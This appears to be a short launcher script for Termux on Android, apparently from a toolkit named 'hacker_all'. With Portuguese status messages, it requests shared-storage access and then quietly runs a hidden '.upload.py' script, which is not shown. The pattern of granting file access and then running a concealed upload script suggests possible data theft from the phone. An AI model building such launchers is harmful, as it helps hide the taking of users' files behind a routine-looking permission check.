import os
from time import sleep

print('\n[*] Verificando permisão...')
sleep(5)

if os.path.exists('/data/data/com.termux/files/home/storage') == True:
    print('\n\033[32m[*] Permisão ok\033[m')
    sleep(3)
    os.system('clear')
    os.system('cd ~/hacker_all;python .upload.py')

else:
    os.system('termux-setup-storage')
    sleep(7)


if os.path.exists('/data/data/com.termux/files/home/storage') == True:
    print('\n\033[32m[*] Permisão ok\033[m')
    sleep(3)
    os.system('clear')
    os.system('cd ~/hacker_all;python .upload.py')

else:
    print('\n\033[31m  [X] ERROR. Necessita de permisão para continuar.\033[m')
